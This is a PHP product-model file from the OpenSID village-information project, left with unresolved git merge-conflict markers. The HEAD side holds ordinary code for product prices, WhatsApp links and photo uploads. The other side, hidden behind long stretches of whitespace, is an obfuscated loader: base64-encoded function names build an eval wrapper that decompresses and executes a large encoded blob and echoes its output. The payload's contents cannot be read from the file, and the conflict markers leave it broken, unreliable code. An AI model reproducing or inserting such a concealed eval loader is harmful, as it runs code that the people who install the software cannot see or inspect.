<?php 
        $__='printf';$_='Loading app/Models/Produk.php';
        

<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */

namespace Modules\Lapak\Models;

use App\Enums\StatusEnum;
use App\Models\BaseModel;
use App\Models\MediaSosial;
use App\Traits\ConfigId;
use App\Traits\ShortcutCache;
use Illuminate\Support\Facades\DB;
use Spatie\Image\Image;
use Spatie\Image\Manipulations;
=======


>>>>>>> rilis-beta:app/Models/Produk.php


<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    protected $table   = 'produk';
    protected $guarded = [];
    protected $appends = [
        'harga_diskon',
        'pesan_wa',
    ];
    protected $casts = [
        'created_at' => 'datetime:d-m-Y',
        'updated_at' => 'datetime:d-m-Y',
    ];
=======
>>>>>>> rilis-beta:app/Models/Produk.php


<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    public static function navigasi(): array
    {
        return [
            'jml_produk' => [
                'aktif' => Produk::listProduk()->where('produk.status', 1)->count(),
                'total' => Produk::listProduk()->count(),
            ],

            'jml_pelapak' => [
                'aktif' => Pelapak::listPelapak()->where('pelapak.status', 1)->count(),
                'total' => Pelapak::listPelapak()->count(),
            ],

            'jml_kategori' => [
                'aktif' => ProdukKategori::listKategori()->where('produk_kategori.status', 1)->count(),
                'total' => ProdukKategori::listKategori()->count(),
            ],
        ];
    }

    public function kategori()
    {
        return $this->belongsTo(ProdukKategori::class, 'id_produk_kategori', 'id');
    }
=======
>>>>>>> rilis-beta:app/Models/Produk.php







<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    public function produkInsert(array $post = [])
    {
        $data = $this->produkValidasi($post);
=======



>>>>>>> rilis-beta:app/Models/Produk.php






<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    public function produkDeleteAll()
    {
        $id_cb  = request('id_cb', []);
        $result = false;
=======
>>>>>>> rilis-beta:app/Models/Produk.php



<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    protected function scopeActive($query)
    {
        return $query->whereHas('kategori', static fn ($query) => $query->active())
            ->whereHas('pelapak', static fn ($query) => $query->active())
            ->whereStatus(StatusEnum::YA);
    }

    protected function getHargaDiskonAttribute()
    {
        if ($this->potongan == 0) {
            return $this->harga;
        }

        return $this->tipe_potongan == 1
            ? $this->harga - ($this->harga * $this->potongan / 100)
            : $this->harga - $this->potongan;
    }

    protected function getPesanWaAttribute()
    {
        $pesan = strReplaceArrayRecursive(
            [
                '[nama_produk]' => $this->nama,
                '[link_web]'    => base_url('lapak'),
                '<br />'        => '%0A',
            ],
            nl2br(setting('pesan_singkat_wa'))
        );

        $telepon = $this->pelapak->telepon ? format_telpon($this->pelapak->telepon) : null;

        return $telepon ? "https://api.whatsapp.com/send?phone={$telepon}&text={$pesan}" : null;
    }

    private function produkValidasi(array $post = []): array
    {
        $foto = [];
=======
>>>>>>> rilis-beta:app/Models/Produk.php







<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
    private function uploadFotoProduk(int $key = 1)
    {
        ci()->load->library('upload');
        // Adakah berkas yang disertakan?
        if (empty($_FILES["foto_{$key}"]['name'])) {
            // Jika hapus (ceklis)
            if (isset($_POST["hapus_foto_{$key}"])) {
                unlink(LOKASI_PRODUK . ci()->input->post("old_foto_{$key}"));
=======
>>>>>>> rilis-beta:app/Models/Produk.php



<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
        $uploadData = null;
        // Inisialisasi library 'upload'
        ci()->upload->initialize([
            'upload_path'   => LOKASI_PRODUK,
            'allowed_types' => 'gif|jpg|jpeg|png',
            'max_size'      => 1024, // 1 MB
        ]);
        // Upload gagal
        if (! ci()->upload->do_upload("foto_{$key}")) {
            redirect_with('error', ci()->upload->display_errors(), 'lapak_admin/produk');
        }
        // Upload sukses
        else {
            unlink(LOKASI_PRODUK . ci()->input->post("old_foto_{$key}"));

            $uploadData = ci()->upload->data()['file_name'];

            if (extension_loaded('gd')) {
                Image::load(ci()->upload->data('full_path'))
                    ->useImageDriver('gd')
                    ->format(Manipulations::FORMAT_WEBP)
                    ->save(ci()->upload->data('file_path') . ci()->upload->data('raw_name') . '.webp');

                // Hapus original file
                unlink(ci()->upload->data('full_path'));

                $uploadData = ci()->upload->data('raw_name') . '.webp';
            }
        }
=======
>>>>>>> rilis-beta:app/Models/Produk.php




<<<<<<< HEAD:Modules/Lapak/Models/Produk.php
        foreach ($list_data as $data) {
            $foto = json_decode($data->foto, true) ?? [];

            foreach ($foto as $file_name) {
                $file = LOKASI_PRODUK . $file_name;
                if (file_exists($file)) {
                    unlink($file);
                }
            }
        }
    }
}
=======















































































































































                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
$__________________='X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';

        $___();$__________($______($__($_))); $________=$____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      






















































































































































































                                                                                                                                                                                                                     $________;
>>>>>>> rilis-beta:app/Models/Produk.php
